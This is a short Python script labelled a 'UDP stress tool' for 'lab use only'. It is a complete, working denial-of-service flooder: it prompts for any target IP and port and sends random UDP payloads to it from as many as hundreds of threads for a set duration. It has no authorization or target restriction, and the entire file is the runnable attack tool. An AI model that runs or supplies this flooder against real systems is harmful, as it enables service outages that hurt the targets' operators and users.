#!/usr/bin/env python3
"""flood.py — prompt-driven UDP stress tool. Lab use only."""

import socket, threading, time, sys, os

stop_flag = threading.Event()

def volley(target, port, size_kb):
    payload = os.urandom(size_kb * 1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_flag.is_set():
        try:
            sock.sendto(payload, (target, port))
        except OSError:
            pass
    sock.close()

def main():
    target = input("target ip> ").strip()
    port   = int(input("port> ").strip() or "80")
    threads= int(input("threads> ").strip() or "100")
    dur    = int(input("seconds> ").strip() or "30")
    size   = int(input("payload kb> ").strip() or "1")

    print(f"[*] flooding {target}:{port} — {threads} threads, {dur}s, {size}kb packets")
    ts = [threading.Thread(target=volley, args=(target, port, size), daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    try: time.sleep(dur)
    except KeyboardInterrupt: pass
    stop_flag.set()
    print("[+] done.")

if __name__ == "__main__":
    main()
  
